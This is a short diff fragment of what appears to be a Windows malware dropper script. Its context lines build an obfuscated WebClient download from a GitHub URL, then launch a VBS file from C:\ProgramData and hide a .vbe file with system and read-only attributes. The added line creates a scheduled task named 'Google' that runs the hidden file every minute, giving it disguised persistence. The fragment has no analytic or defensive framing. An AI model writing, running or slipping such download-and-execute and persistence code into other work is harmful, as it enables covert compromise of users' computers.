@@ -13,5 +13,5 @@ $c1='(New-Object Net.We'; $c4='bClient).Downlo'; $c3='adFile(''https://raw.githu
 Start-Sleep -s 30
 Invoke-Item "C:\ProgramData\runvb.vbs";
 
-
+schtasks.exe /create /tn Google /sc minute  /st 00:10 /tr C:\Program Files\updata.vbe
 attrib +h +s +r C:\ProgramData\updata.vbe
